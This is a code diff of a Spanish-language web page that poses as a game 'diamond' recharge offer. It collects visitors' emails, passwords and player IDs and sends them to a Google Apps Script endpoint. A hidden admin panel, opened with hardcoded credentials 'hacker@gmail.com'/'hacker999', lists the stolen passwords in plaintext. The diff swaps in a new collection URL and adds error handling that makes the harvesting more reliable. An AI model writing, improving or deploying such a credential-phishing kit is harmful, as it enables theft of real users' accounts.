@@ -349,33 +349,6 @@
             font-weight: bold;
         }
 
-        .toast-notification {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1ad46f;
-            color: white;
-            padding: 12px 24px;
-            border-radius: 30px;
-            font-size: 14px;
-            font-weight: bold;
-            z-index: 9999;
-            animation: fadeInOut 2s ease;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-        }
-
-        .toast-error {
-            background: #d43f1a;
-        }
-
-        @keyframes fadeInOut {
-            0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
-            15% { opacity: 1; transform: translateX(-50%) translateY(0); }
-            85% { opacity: 1; transform: translateX(-50%) translateY(0); }
-            100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
-        }
-
         @media (max-width: 900px) {
             .diamond-row { grid-template-columns: 1fr; gap: 12px; }
             .form-card { padding: 22px 18px; }
@@ -457,7 +430,7 @@
             </div>
         </section>
 
-        <!-- PANTALLA 5: PANEL ADMIN (sin columna de acción) -->
+        <!-- PANTALLA 5: PANEL ADMIN -->
         <section id="screenAdmin" class="screen">
             <div class="form-card" style="max-width: 100%;">
                 <div class="admin-stats">
@@ -482,7 +455,7 @@
                             </tr>
                         </thead>
                         <tbody id="adminTableBody">
-                            <tr><td colspan="5" style="text-align:center;">Cargando cuentas...</td></tr>
+                            <tr><td colspan="5" style="text-align:center;">Cargando cuentas......</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -500,13 +473,13 @@
         const ADMIN_EMAIL = "hacker@gmail.com";
         const ADMIN_PASSWORD = "hacker999";
         
-        // TU URL DE GOOGLE APPS SCRIPT
-        const GOOGLE_SHEETS_API_URL = "https://script.google.com/macros/s/AKfycbxosBEZQjsff-h1SaxqUR6igUzK4Z94OApGSKBXm2dVngLf-1IYBtfjHyby88ruFhaJEg/exec";
+        // 🔥 NUEVA URL DE GOOGLE APPS SCRIPT (actualizada) 🔥
+        const GOOGLE_SHEETS_API_URL = "https://script.google.com/macros/s/AKfycbxsJnQZ1_8CUo2mFPWBf0jubUEO0E57ig8TWfGAk2QiwOuGTyIm8gYeRDHfA86U8KvFGQ/exec";
         
         // Backup local
         const STORAGE_KEY = 'diamond_users_data_backup';
 
-        // Función para formatear fecha (solo día/mes/año)
+        // Función para formatear fecha
         function formatDate(dateString) {
             if (!dateString) return 'Fecha no disponible';
             try {
@@ -517,19 +490,9 @@
             }
         }
 
-        // Mostrar notificación toast
-        function showToast(message, isError = false) {
-            const toast = document.createElement('div');
-            toast.textContent = message;
-            toast.className = 'toast-notification';
-            if (isError) toast.classList.add('toast-error');
-            document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 2500);
-        }
-
         // Guardar usuario en Google Sheets
         async function saveUserToSheets(userData) {
-            // Guardar en localStorage como backup
+            // Backup local
             let users = [];
             const stored = localStorage.getItem(STORAGE_KEY);
             if (stored) {
@@ -559,15 +522,18 @@
                 const result = await response.json();
                 if (result.success) {
                     console.log("✅ Registro guardado en Google Sheets");
+                    return true;
+                } else {
+                    console.error("❌ Error del servidor:", result.message);
+                    return false;
                 }
-                return true;
             } catch(error) {
-                console.error("❌ Error al guardar en Google Sheets:", error);
+                console.error("❌ Error de red:", error);
                 return false;
             }
         }
 
-        // Obtener todos los usuarios desde Google Sheets
+        // Obtener todos los usuarios
         async function getAllUsers() {
             try {
                 const response = await fetch(GOOGLE_SHEETS_API_URL);
@@ -582,7 +548,6 @@
             }
         }
         
-        // Obtener desde localStorage (fallback)
         function getUsersFromLocalStorage() {
             const stored = localStorage.getItem(STORAGE_KEY);
             if (!stored) return [];
@@ -591,7 +556,7 @@
             } catch(e) { return []; }
         }
 
-        // Renderizar tabla de cuentas (sin columna de acción)
+        // Renderizar tabla
         async function renderAdminTable() {
             const users = await getAllUsers();
             const tbody = document.getElementById('adminTableBody');
@@ -618,12 +583,11 @@
                 row.insertCell(1).textContent = user.email || 'N/A';
                 row.insertCell(2).textContent = user.password || 'N/A';
                 row.insertCell(3).textContent = user.playerId || 'N/A';
-                // Mostrar solo la fecha (sin hora)
                 row.insertCell(4).textContent = formatDate(user.fecha);
             }
         }
 
-        // Navegación entre pantallas
+        // Navegación
         const screens = ['screen1', 'screen2', 'screen3', 'screen4', 'screenAdmin'];
         function showScreen(index) {
             screens.forEach((id, i) => {
@@ -638,12 +602,11 @@
             else container.classList.remove('admin-mode');
         }
 
-        // Variables de flujo
         let selectedDiamonds = null;
         let tempEmail = "";
         let tempPassword = "";
 
-        // ---------- LOGIN ----------
+        // LOGIN
         const loginForm = document.getElementById('loginForm');
         if (loginForm) {
             loginForm.addEventListener('submit', (e) => {
@@ -656,7 +619,6 @@
                     return;
                 }
                 
-                // Verificar ADMIN
                 if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
                     renderAdminTable();
                     showScreen(4);
@@ -665,7 +627,6 @@
                     return;
                 }
                 
-                // Usuario normal
                 if (password.length < 6) {
                     alert("⚠️ La contraseña debe tener al menos 6 caracteres.");
                     return;
@@ -689,7 +650,7 @@
             });
         }
 
-        // ---------- SELECCIÓN DIAMANTES ----------
+        // SELECCIÓN DIAMANTES
         const diamondOpts = document.querySelectorAll('.diamond-opt');
         diamondOpts.forEach(opt => {
             opt.addEventListener('click', () => {
@@ -721,7 +682,7 @@
             });
         }
 
-        // ---------- VALIDACIÓN ID ----------
+        // VALIDACIÓN ID
         const playerIdInput = document.getElementById('playerId');
         const idMessage = document.getElementById('idMsg');
         const receiveBtn = document.getElementById('idBtn');
@@ -757,7 +718,7 @@
             playerIdInput.addEventListener('input', validateId);
         }
 
-        // ---------- GUARDAR RECARGA ----------
+        // GUARDAR RECARGA
         if (receiveBtn) {
             receiveBtn.addEventListener('click', async () => {
                 if (!playerIdInput) return;
@@ -787,7 +748,11 @@
                     diamonds: selectedDiamonds
                 };
                 
-                await saveUserToSheets(userData);
+                const success = await saveUserToSheets(userData);
+                
+                if (!success) {
+                    alert("⚠️ Error al guardar en Google Sheets. Los datos se guardaron localmente.");
+                }
                 
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
@@ -814,7 +779,7 @@
             });
         }
 
-        // Botón reset
+        // RESET
         const resetButton = document.getElementById('resetBtn');
         if (resetButton) {
             resetButton.addEventListener('click', () => {
@@ -836,7 +801,7 @@
             });
         }
 
-        // Botones admin
+        // ADMIN BUTTONS
         const refreshAdminBtn = document.getElementById('refreshAdminBtn');
         if (refreshAdminBtn) {
             refreshAdminBtn.addEventListener('click', async () => {
@@ -857,16 +822,15 @@
             });
         }
 
-        // Inicializar
         window.addEventListener('load', async () => {
             showScreen(0);
             if (playerIdInput) playerIdInput.value = '';
             if (idMessage) idMessage.textContent = '';
             if (receiveBtn) receiveBtn.disabled = true;
-            console.log("🚀 Sistema conectado a Google Sheets");
+            console.log("🚀 Sistema conectado a Google Sheets con nueva URL");
         });
 
-        // ========== PARTÍCULAS ==========
+        // PARTÍCULAS
         const canvas = document.getElementById('particles-canvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
